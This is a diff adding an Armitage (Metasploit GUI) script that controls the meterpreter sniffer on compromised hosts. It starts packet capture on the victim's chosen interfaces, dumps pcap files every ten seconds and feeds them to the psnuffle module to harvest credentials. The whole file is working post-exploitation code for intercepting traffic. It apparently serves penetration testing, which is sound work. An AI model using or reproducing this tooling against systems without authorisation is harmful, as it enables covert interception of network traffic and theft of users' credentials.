@@ -1,0 +1,116 @@
+# Control the meterpreter sniffer feature through Armitage.
+
+global('$sid %sniffers');
+%sniffers = ohash();
+setMissPolicy(%sniffers, { return @(); });
+
+popup meterpreter_bottom {
+	menu "&Sniffer" {
+		item "&Start" {
+			m_cmd($1, "use sniffer");
+
+			# queue several sysinfo commands to bide our time while sniffer loads
+			m_cmd($1, "sysinfo");
+			m_cmd($1, "sysinfo");
+			m_cmd($1, "sysinfo");
+			m_cmd($1, "sysinfo");
+
+			m_cmd($1, "sniffer_interfaces");
+		}
+
+		item "S&top" {
+			foreach $interface (%sniffers[$1]) {
+				m_cmd($1, "sniffer_stop $interface");
+				m_cmd($1, "sniffer_release $interface");
+				show_message("Stopped sniffer");
+			}
+			%sniffers[$1] = @();
+		}
+
+		separator($1);
+
+		item "&pSnuffle" {
+			if ($1 !in %sniffers && size(%sniffers[$1]) > 0) {
+				show_message("Sniffer not started");
+				return;
+			}
+
+			$interface = %sniffers[$1][0];
+			$f = log_resource(session_host($1), "sniff $+ $interface $+ .pcap");
+
+			if (!-exists $f) {
+				show_message("No packets dumped yet");
+				return;
+			}
+
+			m_cmd($1, "sniffer_dump $interface $f");
+
+			$console = open_console_tab("pSnuffle");
+			cmd($console, "use auxiliary/sniffer/psnuffle");
+			cmd($console, "set PCAPFILE $f");
+			cmd($console, "run -j");
+		}
+	}
+}
+
+on meterpreter_sniffer_interfaces {
+	local('$entry $id $desc $dhcp $wifi @interfaces');
+
+	# store the session id in a global var
+	$sid = $1;
+
+	# parse any interface information
+	foreach $entry (split("\n", $3)) {
+		if ($entry ismatch "(\\d+) - '(.*?)' . type:\\d+ mtu:\\d+ usable:true dhcp:(\\w+) wifi:(\\w+).*") {
+			($id, $desc, $dhcp, $wifi) = matched();
+			push(@interfaces, %(id => $id, description => $desc, dhcp => $dhcp, wifi => $wifi));
+		}
+	}
+
+	# let the user choose which interface to grab stuff from
+	prompt_list("Interfaces", @("Sniff"), @('id', 'description', 'dhcp', 'wifi'), @interfaces, 640, 480);
+}
+
+on item_selected {
+	fire_event_local("start_sniffing", $sid, $2);
+}
+
+on start_sniffing {
+	m_cmd($1, "sniffer_start $2");
+	push(%sniffers[$1], $2);
+	show_message("Started sniffer");
+}
+
+# periodically dump the sniffer stuff...
+on heartbeat_10s {
+	local('$sid $interfaces $f');
+	foreach $sid => $interfaces (%sniffers) {
+		foreach $interface ($interfaces) {
+			$f = log_resource(session_host($sid), "sniff $+ $interface $+ .pcap");
+			m_cmd($sid, "sniffer_dump $interface $f");
+		}
+	}
+}
+
+on session_close {
+	%sniffers[$1] = @();
+}
+
+filter host_image {
+	local('$address $session $doit');
+	$address = $2['address'];
+
+	foreach $session (host_sessions($address)) {
+		if ($session in %sniffers && size(%sniffers[$session]) > 0) {
+			$doit = 1;
+		}
+	}
+
+	if ($doit) {
+		if (-exists script_resource("sniff.png")) {
+			push($1, script_resource("sniff.png"));
+		}
+	}
+
+	return @_;
+}
